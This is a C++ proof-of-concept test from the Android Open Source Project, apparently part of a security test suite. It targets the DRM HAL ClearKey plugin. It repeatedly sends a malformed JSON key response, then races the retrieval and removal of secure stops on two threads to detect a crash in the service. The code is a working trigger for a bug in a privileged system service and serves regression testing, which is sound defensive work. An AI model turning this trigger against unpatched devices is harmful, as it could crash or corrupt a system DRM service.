/**
 * Copyright (C) 2019 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
#include <android/hidl/manager/1.0/IServiceManager.h>
#include <android/hardware/drm/1.1/IDrmFactory.h>
#include <android/hardware/drm/1.1/IDrmPlugin.h>
#include <pthread.h>
#include <signal.h>
#include <utils/Log.h>
#include <utils/String8.h>
#include <utils/Vector.h>

#include "../includes/common.h"

using ::android::sp;
using ::android::String8;
using ::android::Vector;
using ::android::hardware::hidl_string;
using ::android::hardware::hidl_vec;
using ::android::hardware::drm::V1_0::IDrmFactory;
using ::android::hardware::drm::V1_0::IDrmPlugin;
using ::android::hardware::drm::V1_0::SecureStop;
using ::android::hardware::drm::V1_0::Status;
using ::android::hardware::drm::V1_1::SecurityLevel;
using ::android::hidl::manager::V1_0::IServiceManager;

static Vector<uint8_t> sessionId;

static Vector<sp<IDrmFactory>> drmFactories;
static sp<IDrmPlugin> drmPlugin;
static sp<::android::hardware::drm::V1_1::IDrmPlugin> drmPluginV1_1;

static void handler(int) {
  ALOGI("Good, the test condition has been triggered");
  exit(EXIT_VULNERABLE);
}

static const Vector<uint8_t> toVector(const hidl_vec<uint8_t> &vec) {
  Vector<uint8_t> vector;
  vector.appendArray(vec.data(), vec.size());
  return *const_cast<const Vector<uint8_t> *>(&vector);
}

static hidl_vec<uint8_t> toHidlVec(const Vector<uint8_t> &vector) {
  hidl_vec<uint8_t> vec;
  vec.setToExternal(const_cast<uint8_t *>(vector.array()), vector.size());
  return vec;
}

static void makeDrmFactories() {
  sp<IServiceManager> serviceManager = IServiceManager::getService();
  if (serviceManager == NULL) {
    ALOGE("Failed to get service manager");
    exit(-1);
  }
  serviceManager->listByInterface(
      IDrmFactory::descriptor,
      [](const hidl_vec<hidl_string> &registered) {
        for (const auto &instance : registered) {
          auto factory = IDrmFactory::getService(instance);
          if (factory != NULL) {
            ALOGV("found drm@1.0 IDrmFactory %s", instance.c_str());
            drmFactories.push_back(factory);
          }
        }
      });

  serviceManager->listByInterface(
      ::android::hardware::drm::V1_1::IDrmFactory::descriptor,
      [](const hidl_vec<hidl_string> &registered) {
        for (const auto &instance : registered) {
          auto factory =
              ::android::hardware::drm::V1_1::IDrmFactory::getService(instance);
          if (factory != NULL) {
            ALOGV("found drm@1.1 IDrmFactory %s", instance.c_str());
            drmFactories.push_back(factory);
          }
        }
      });

  return;
}

static sp<IDrmPlugin> makeDrmPlugin(const sp<IDrmFactory> &factory,
                                    const uint8_t uuid[16],
                                    const String8 &appPackageName) {
  sp<IDrmPlugin> plugin;
  factory->createPlugin(uuid, appPackageName.string(),
                        [&](Status status, const sp<IDrmPlugin> &hPlugin) {
                          if (status != Status::OK) {
                            return;
                          }
                          plugin = hPlugin;
                        });
  return plugin;
}

static void createPlugin() {
  const uint8_t uuid[16] = {0x10, 0x77, 0xef, 0xec, 0xc0, 0xb2, 0x4d, 0x02,
                            0xac, 0xe3, 0x3c, 0x1e, 0x52, 0xe2, 0xfb, 0x4b};
  for (size_t i = 0; i < drmFactories.size(); i++) {
    if (drmFactories[i]->isCryptoSchemeSupported(uuid)) {
      drmPlugin = makeDrmPlugin(drmFactories[i], uuid, String8("ele7enxxh"));
      if (drmPlugin != NULL)
        drmPluginV1_1 =
            ::android::hardware::drm::V1_1::IDrmPlugin::castFrom(drmPlugin);
    }
  }

  if (drmPlugin == NULL) {
    ALOGE("Failed to create drm plugin");
    exit(-1);
  }

  return;
}

static void openSession() {
  if (drmPluginV1_1)
    drmPluginV1_1->openSession_1_1(
        SecurityLevel::SW_SECURE_CRYPTO,
        [&](Status status, const hidl_vec<uint8_t> &id) {
          if (status != Status::OK) {
            ALOGE("Failed to open session v1_1");
            exit(-1);
          }
          sessionId = toVector(id);
        });
  else {
    drmPlugin->openSession([&](Status status, const hidl_vec<uint8_t> &id) {
      if (status != Status::OK) {
        ALOGE("Failed to open session");
        exit(-1);
      }
      sessionId = toVector(id);
    });
  }

  return;
}

static void provideKeyResponse() {
  const char key[] =
      "{\"keys\":[{\"kty\":\"oct\""
      "\"alg\":\"A128KW1\"}{\"kty\":\"oct\"\"alg\":\"A128KW2\""
      "\"k\":\"SGVsbG8gRnJpZW5kIQ\"\"kid\":\"Y2xlYXJrZXlrZXlpZDAy\"}"
      "{\"kty\":\"oct\"\"alg\":\"A128KW3\""
      "\"kid\":\"Y2xlYXJrZXlrZXlpZDAz\"\"k\":\"R29vZCBkYXkh\"}]}";
  Vector<uint8_t> response;
  response.appendArray((const unsigned char *)key, strlen(key));
  drmPlugin->provideKeyResponse(toHidlVec(sessionId), toHidlVec(response),
                                [&](Status status, const hidl_vec<uint8_t> &) {
                                  if (status != Status::OK) {
                                    ALOGE("Failed to provide key response");
                                    exit(-1);
                                  }
                                });

  return;
}

static void *getSecureStops(void *) {
  drmPlugin->getSecureStops([&](Status status, const hidl_vec<SecureStop> &) {
    if (status != Status::OK) {
      ALOGE("Failed to get secure stops");
      exit(-1);
    }
  });

  return NULL;
}

static void *removeAllSecureStops(void *) {
  if (drmPluginV1_1 != NULL)
    drmPluginV1_1->removeAllSecureStops();
  else
    drmPlugin->releaseAllSecureStops();

  return NULL;
}

int main(void) {
  signal(SIGABRT, handler);

  makeDrmFactories();

  createPlugin();

  openSession();

  size_t loop = 1000;
  while (loop--) provideKeyResponse();

  pthread_t threads[2];
  pthread_create(&threads[0], NULL, getSecureStops, NULL);
  pthread_create(&threads[1], NULL, removeAllSecureStops, NULL);
  pthread_join(threads[0], NULL);
  pthread_join(threads[1], NULL);

  return 0;
}
